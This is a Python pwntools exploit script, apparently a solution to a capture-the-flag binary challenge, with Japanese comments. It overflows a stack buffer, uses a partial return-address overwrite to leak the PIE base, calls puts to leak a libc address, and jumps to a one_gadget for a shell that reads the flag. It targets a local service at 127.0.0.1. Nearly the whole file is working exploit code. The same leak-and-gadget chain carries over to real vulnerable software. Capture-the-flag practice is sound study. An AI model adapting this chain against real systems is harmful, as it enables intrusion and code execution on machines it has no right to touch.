#!/usr/bin/env python3
from pwn import *

elf = ELF("./problem/chall")
libc = ELF("./problem/libc.so.6")
context.binary = elf
context.log_level = "DEBUG"

def exploit(p):
    # PIEベースアドレスのリーク
    # messageバッファ内にnullが入らないようにしてvuln関数へリターンさせつつvuln関数のアドレスをリークする
    offset = 0x30
    payload = b'A' * (offset + 0x8)
    payload += b'\x26' # 下位12bitは固定のため、vuln関数のベースアドレス1byte分ずらす
    p.sendafter(b"> ", payload)
    p.recvuntil(b'Message: ')
    message = p.recvuntil(b"Welcome to the second pivot game!")
    leaked_data = message[offset+0x8:-34]  # 'A'の後のアドレスデータ
    leaked_addr = u64(leaked_data.ljust(8, b'\x00'))
    log.success(f"Leaked address: {hex(leaked_addr)}")
    pie_base = leaked_addr - 0x1226 # call vuln
    log.success(f"PIE base address: {hex(pie_base)}")

    # libcベースアドレスのリーク
    # ediに_IO_funlockfileのアドレスが入るため、putsを使ってリークできる
    # 後は差分からlibcベースアドレスを取得する
    return_to_puts = b'A' * offset
    return_to_puts += p64(pie_base + 0x5000 - 0x10) # 適当に書き込み可能なアドレスを指定
    return_to_puts += p64(pie_base + elf.symbols["vuln"] + 0x12)
    p.sendafter(b"> ", return_to_puts)
    p.recvuntil(b'Message: ')
    message = p.recvuntil(b'> ')
    leaked_data = message[offset+0x7:-3] # 'A'の後のアドレスデータ
    leaked_addr = u64(leaked_data.ljust(8, b'\x00'))
    log.success(f"Leaked address: {hex(leaked_addr)}")
    libc_base = leaked_addr - 0x62050 # _IO_funlockfileのベースアドレス
    log.success(f"libc base address: {hex(libc_base)}")

    # one gadget
    payload = b"A" * offset
    payload += p64(libc_base + 0x21c000) # saved rbp
    payload += p64(libc_base + 0xebd3f) # one_gadgetアドレス
    p.send(payload)
    p.interactive() # cat flag*


GDBSCRIPT = r"""
set show-tips off
set follow-fork-mode parent
handle SIGALRM nostop
# breakrva 0x118b
"""

ELF_PATH_IN_CONTAINER = "/app/run"
CONTAINER_NAME = "debug-pivot4b-1"
GDB_SERVER_PORT = 12345

def debug_docker():
    with process(["docker", "exec", "-i", CONTAINER_NAME, "gdbserver", f"localhost:{GDB_SERVER_PORT}", ELF_PATH_IN_CONTAINER]) as io:
        pid = gdb.attach(target=("localhost", GDB_SERVER_PORT), gdbscript=GDBSCRIPT, exe=elf.path)
        print(f"{pid = }")
        exploit(io)


def exec_remote():
    io = remote('127.0.0.1', 12300)
    exploit(io)


# debug_docker()
exec_remote()